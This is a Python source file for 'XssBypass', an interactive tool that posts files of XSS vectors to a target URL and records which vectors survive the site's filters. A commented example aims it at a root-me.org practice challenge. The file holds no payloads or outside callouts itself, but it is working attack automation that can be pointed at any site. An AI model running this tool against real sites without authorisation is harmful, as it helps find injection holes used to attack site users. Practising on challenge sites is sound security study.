import os
import argparse
import requests
import os
import sys
import re
import time
from bs4 import BeautifulSoup

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def delay_print(s, x):
	for c in s:
		sys.stdout.write(c)
		sys.stdout.flush()
		time.sleep(x)
"""
class XssBypass is a class who will check if filters in a vulnerability can be bypassed
It will send request to a vulnerable web site, using XSS premade vectors who are stocked in files (data = [pathvectors1, pathvectors2]).
the data are created by the method .createdata
To init the class, you will need the url you want to attack

To launch the attack you have to use de .attack method.
The method requires a json (or dict in python) to launch the post request to the web site
you can create your json manually using a dict type variable 
ex : my_json = {
	'name' : value,
	'name2' : target, #->this is the post name who will get exploited
	'name3' : value
}
or use the **json_request params of the method 
ex : XssBypass.attack(premade_json = None, 'name' = value,'name2' = target 'nam3' = value2)
YOU ALSO NEED TO ENTER THE LINE WHERE THE VECTOR WILL GET STOCKED IN THE HTML PAGE in the source_code position variable
in order to check the responses
the method will return a list of responses. 

"""
class XssBypass(): 
	def __init__(self, url, data = None):
		self.url = url
		self.data = {}
		self.json = None
	def create_data(self, *args):#data = list qui va etre ensuite crée en dictionaire avec "path" : content,
		try:
			for data in args:
				if type(data) == str:
					fd = open(data, 'r+')
					self.data[data] = fd.read().split('\n')	
				elif type(data) == tuple or type(data) == list:
					for files in data:
						fd = open(files, 'r+')
						self.data[files] = fd.read().split('\n')
				else:
					raise ValueError
			return(self.data)
		except ValueError:
			print("create_data methods can only contain list, tupe and str arguments")

	"""
	make a request POST with the json post_request data, then return the response of the serveur
	"""
	def request(self,type_request, **json_request):
		if self.json == None:
			self.json = json_request
		if type_request == 'post':
			response = requests.post(self.url, data = json_request)
		elif type_request == 'get':
			response = requests.get(self.url, json_request)
		return(response) 
	
	"""
	method who checks if my target is in my response LINE
	"""
	def	compare_2(self, target, line_nb, response, display = 'no', **json_request):
		c = bcolors()
		response = response.text.split('\n')
		index = line_nb - 1
		if len(response) >= index:
			if json_request[target] in response[index]:
				if display == 'yes':
					print(c.OKGREEN + json_request[target] + c.ENDC)
				return ('success')
			else:
				if display == 'yes':
					print(c.FAIL + json_request[target] + c.ENDC)
				return ('fail')
		else:
			if display == 'yes':
				print(c.FAIL + json_request[target] + c.ENDC)
			return ('fail')

	"""
	check if my target is in my response (less precise than compare_2)
	"""
	def	compare(self, target, response, display = 'no', **json_request):
		c = bcolors()
		if json_request[target] in response.text:
			if display == 'yes':
				print(c.OKGREEN + json_request[target] + c.ENDC)
			return ('success')
		else:
			if display == 'yes':
					print(c.FAIL + json_request[target] + c.ENDC)
			return ('fail')

	"""
	store the results into a results directory
	"""
	def store(self):
		regex = r"[^\\\/]+(?=\.[\w]+$)|[^\\\/]+$"
		if not os.path.isdir('./results'):
			os.mkdir('xss_results')
		for key, value in self.results.items():
			match = re.search(regex, key)
			fd = open("./results/" + match.group(0) + '_results.txt', 'w+')
			txt = "-----------SUCCESS----------- \n\n" + '\n'.join(value['success']) + "\n\n-----------FAIL-----------\n\n" + '\n'.join(value['fail'])
			fd.write(txt)
			fd.close()

	"""
	main function, it roles is to attack the value of the url by injecting vectors and check 
	if vectors are bypassed or not
	"""
	def attack(self, data,type_request,premade_json = None, injection_line = -1, display='no', **json_request): 
		url = self.url
		cmpt = -1
		self.response = []
		self.results = {}
		lst_vectors = []
		success_vectors = []
		fail_vectors = []
		self.data = self.create_data(data)
		if premade_json != None:
			json_request = premade_json
		for key , value in json_request.items():
			if value == 'target':
				target = key
		for srcs,value in self.data.items():
			for vectors in value:
				json_request[target] = vectors
				self.response.append(self.request(type_request, **json_request))
				cmpt += 1
				if injection_line >= 0:
					x = self.compare_2(target,injection_line, self.response[cmpt],display, **json_request)
				else:
					x = self.compare(target, self.response[cmpt],display, **json_request)
				if (x == 'success'):
					success_vectors = success_vectors + [vectors]
				if (x == 'fail'):
					fail_vectors = fail_vectors + [vectors]
			self.results[srcs] = dict(success = success_vectors,fail = fail_vectors)
			success_vectors = []
			fail_vectors = []
		return (self.results)
	

if __name__ == "__main__":	

	b = bcolors()
	
	delay_print(b.OKGREEN + "[drama - XssBypass]\n\nuse https://github.com/tbrizon/drama_scrapper.git to collect some data\n\nurl to request =  \n", 0.01)
	json = {}
	v_paths = []
	x = 0
	display = 'yes'
	url = input('')
	bypass = XssBypass(url)
	delay_print('what type of request do you want ? (post, get etc) : \n', 0.01)
	type_request = input('')
	delay_print("creating json for the request : \nenter [name value [enter]] to create an element, if value == 'target', you will launch the attack on json[name]=='target'\n", 0.01)
	while True:
		json_input = input("")
		if json_input == '':
			break
		json.update(dict(x.split() for x in json_input.splitlines()))
		print(json)
	delay_print("add the line where you think the injection will be in the response source code (it's more effective but you can juste press enter to skip) ?\n", 0.01)
	
	x_input = input("")
	if x_input == '':
		delay_print(b.OKBLUE + "no line added (must be >= 0 btw)\n" + b.ENDC, 0.01)
		injection_line = -1
	else:
		x = int(x_input)
		if x >= 0:
			injection_line = x
	x = 0
	delay_print(b.OKGREEN + "\nnow, enter the path of files of vectors you want to test : \n", 0.01)
	while True:
		v_paths.append((input("")))
		if (v_paths[x] == ''):
			break 
		if not os.path.exists(v_paths[x]):
			v_paths.remove(v_paths[x])
			raise IOError(b.FAIL + "file not found")
		x = x + 1
	v_paths.remove('')
	delay_print(b.OKGREEN + "enter 'no' if you don't want to display tested vectors\n", 0.01)
	rp = input("")
	if rp == 'no':
		display = 'no'
	delay_print("\ncheck if all the value are correct :\n{}url = {}\njson = {}\ndata to test {}\n".format(b.BOLD,url, json
	, v_paths) + b.ENDC, 0.01)
	delay_print(b.HEADER + "\n\npress enter to launch", 0.01)
	launcher = input('')
	if launcher == '':
		bypass.attack(v_paths,type_request, display=display,injection_line=injection_line, premade_json=json)
	else:
		delay_print(b.HEADER + "\n\nseeya", 0.03)
	delay_print(b.HEADER + "\n\nparsing results with the .store method on a xss_results directory", 0.02)
	bypass.store()
	"""
	param = {
		'title' : 'ok',
		'message' : 'target'
	}

	a = XssBypass('http://challenge01.root-me.org/web-client/ch21/index.php')
	a.attack(["./data/event_html.txt"], 'post',display='no',premade_json=param, injection_line=31)
	a.store()
	"""